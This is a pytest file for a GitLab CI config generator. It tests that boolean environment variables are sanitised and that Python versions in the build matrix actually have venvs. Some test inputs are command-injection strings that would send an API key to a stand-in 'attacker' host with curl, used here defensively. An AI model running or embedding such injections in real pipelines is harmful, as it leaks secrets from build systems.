"""Tests for scripts/gen_gitlab_config.py."""

import importlib.util
import pathlib
import re
import sys
import types
from unittest import mock

import pytest


_SCRIPT_PATH = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "gen_gitlab_config.py"


@pytest.fixture(scope="module")
def gen_gitlab_config_mod():
    # The script is not importable as-is: it runs under uv with its own dependencies, parses argv at
    # import time, and appends to sys.path. Stub ruamel.yaml, give it an empty argv, and restore
    # sys.path afterwards so the rest of the suite is unaffected.
    ruamel = types.ModuleType("ruamel")
    yaml = types.ModuleType("ruamel.yaml")

    class YAML:
        def load(self, content):
            return {"variables": {"TESTRUNNER_IMAGE": "testrunner:fake"}}

    yaml.YAML = YAML
    ruamel.yaml = yaml

    spec = importlib.util.spec_from_file_location("gen_gitlab_config", _SCRIPT_PATH)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    original_path = list(sys.path)
    with mock.patch.dict(sys.modules, {"ruamel": ruamel, "ruamel.yaml": yaml, spec.name: module}):
        with mock.patch.object(sys, "argv", [str(_SCRIPT_PATH)]):
            spec.loader.exec_module(module)
        try:
            yield module
        finally:
            sys.path[:] = original_path


@pytest.mark.parametrize(
    "value, expected",
    [
        (None, "false"),
        ("", "false"),
        ("false", "false"),
        ("true", "true"),
        ("TRUE", "true"),
        (" true", "false"),
        ("$(curl attacker/$DD_API_KEY)", "false"),
        ('true" && curl attacker/$DD_API_KEY #', "false"),
    ],
)
def test_get_bool_env_only_allows_literal_true(gen_gitlab_config_mod, monkeypatch, value, expected):
    monkeypatch.delenv("NIGHTLY_BUILD", raising=False)
    if value is not None:
        monkeypatch.setenv("NIGHTLY_BUILD", value)

    assert gen_gitlab_config_mod._get_bool_env("NIGHTLY_BUILD") == expected


def test_jobspec_sanitizes_nightly_build_before_script(gen_gitlab_config_mod, monkeypatch):
    monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")

    with mock.patch.object(gen_gitlab_config_mod.subprocess, "check_output", return_value=b"pip-key\n"):
        config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))

    assert '    - export NIGHTLY_BUILD="false"' in config
    assert "$(curl" not in config
    assert "$DD_API_KEY" not in config


def test_build_base_venvs_template_gets_sanitized_bool_values(gen_gitlab_config_mod, monkeypatch, tmp_path):
    monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")
    monkeypatch.setenv("UNPIN_DEPENDENCIES", "$(curl attacker/$DD_API_KEY)")
    monkeypatch.setattr(gen_gitlab_config_mod, "TESTS_GEN", tmp_path / "tests-gen.yml")
    monkeypatch.setattr(gen_gitlab_config_mod, "_global_python_versions", {"3.11"})

    gen_gitlab_config_mod.gen_build_base_venvs()

    config = (tmp_path / "tests-gen.yml").read_text()
    assert 'echo "NIGHTLY_BUILD: false"' in config
    assert 'echo "UNPIN_DEPENDENCIES: false"' in config
    assert 'if [[ "false" == "true" ]]' in config
    assert "$(curl" not in config
    assert "$DD_API_KEY" not in config


# --- build_base_venvs: a matrix Python version that would test nothing ----------------
#
# build_base_venvs is the only job in the pipeline that pins an interpreter for a riot run
# (`riot run -s --python=$PYTHON_VERSION smoke_test`). riot exits 0 when a --python filter
# matches no venv, so a matrix version smoke_test has no venv for makes that step a no-op
# and the job reports success having tested nothing. The per-suite jobs are not exposed to
# this: they run every hash the suite has, and .gitlab/tests.yml already fails them on an
# empty hash list.


def test_base_venv_suites_parses_the_real_template(gen_gitlab_config_mod):
    """The pattern must match the template as it actually is, or the check reads nothing.

    Asserting against the real file is the point: a template edit that moves the run out of
    the recognised shape has to be caught here rather than quietly emptying the check.
    """
    assert gen_gitlab_config_mod.base_venv_suites() == ["smoke_test"]


def test_base_venv_suites_refuses_a_template_it_cannot_read(gen_gitlab_config_mod, monkeypatch, tmp_path):
    """A template with no interpreter-pinned run is an error, not a silently empty check."""
    templates = tmp_path / "templates"
    templates.mkdir()
    (templates / "build-base-venvs.yml").write_text("build_base_venvs:\n  script: |\n    riot -v run -s smoke_test\n")
    monkeypatch.setattr(gen_gitlab_config_mod, "GITLAB", tmp_path)

    with pytest.raises(ValueError, match="no longer runs a riot suite with --python"):
        gen_gitlab_config_mod.base_venv_suites()


def test_matrix_version_with_no_matching_venv_is_rejected(gen_gitlab_config_mod):
    """The reported failure: a matrix version no smoke_test venv declares."""
    with pytest.raises(ValueError) as excinfo:
        gen_gitlab_config_mod.check_base_venv_suite_coverage(
            ["3.13", "3.14", "3.15"],
            {"smoke_test": {"3.13", "3.14"}},
        )

    message = str(excinfo.value)
    assert "3.15" in message, "the message has to name the version so it is actionable"
    assert "smoke_test" in message, "the message has to name the suite"
    assert "3.13" not in message, "only the uncovered versions belong in the message"


def test_a_suite_with_no_venvs_at_all_is_rejected(gen_gitlab_config_mod):
    """Renaming the suite in the template without renaming it in riotfile.py."""
    with pytest.raises(ValueError, match="renamed_smoke_test"):
        gen_gitlab_config_mod.check_base_venv_suite_coverage(["3.14"], {"renamed_smoke_test": set()})


@pytest.mark.parametrize(
    "py_versions, covered",
    [
        pytest.param(["3.9", "3.14"], {"3.9", "3.14"}, id="matrix_exactly_covered"),
        pytest.param(
            ["3.9", "3.10", "3.11", "3.12"],
            {"3.9", "3.10", "3.11", "3.12", "3.13", "3.14"},
            id="suite_covers_more_than_the_matrix",
        ),
        pytest.param([], {"3.9"}, id="empty_matrix"),
    ],
)
def test_covered_matrix_versions_do_not_fire(gen_gitlab_config_mod, py_versions, covered):
    """Partial coverage is only a problem in one direction.

    A suite whose venvs reach further than the matrix is fine, and so is a matrix narrower
    than the interpreters we support -- that is the normal case, since the matrix is built
    from the interpreters the selected suites actually need. Only a matrix version the suite
    cannot run is a failure.
    """
    gen_gitlab_config_mod.check_base_venv_suite_coverage(py_versions, {"smoke_test": covered})


def test_every_interpreter_pinned_run_in_the_template_is_guarded(gen_gitlab_config_mod):
    """Each interpreter-pinned run needs a zero-match check ahead of it in the job script.

    The generation-time check keeps a bad version out of the matrix, but riot also exits 0
    after merely logging a venv it failed to create, which generation cannot see. The guard
    in the job script is what covers that, so a second pinned run added without one would
    reintroduce the silent pass.
    """
    template = (gen_gitlab_config_mod.GITLAB / "templates" / "build-base-venvs.yml").read_text()

    unguarded = []
    for match in gen_gitlab_config_mod.BASE_VENV_SUITE_RUN.finditer(template):
        suite = match.group(1)
        guard = re.compile(rf"riot list --hash-only --python=\$PYTHON_VERSION\s+{re.escape(suite)}\b")
        if not guard.search(template[: match.start()]):
            unguarded.append(suite)

    assert not unguarded, (
        f"build-base-venvs.yml runs {', '.join(unguarded)} with --python=$PYTHON_VERSION without first "
        "checking that the filter matches a venv. riot exits 0 on an empty match, so that step would "
        "pass having run nothing."
    )
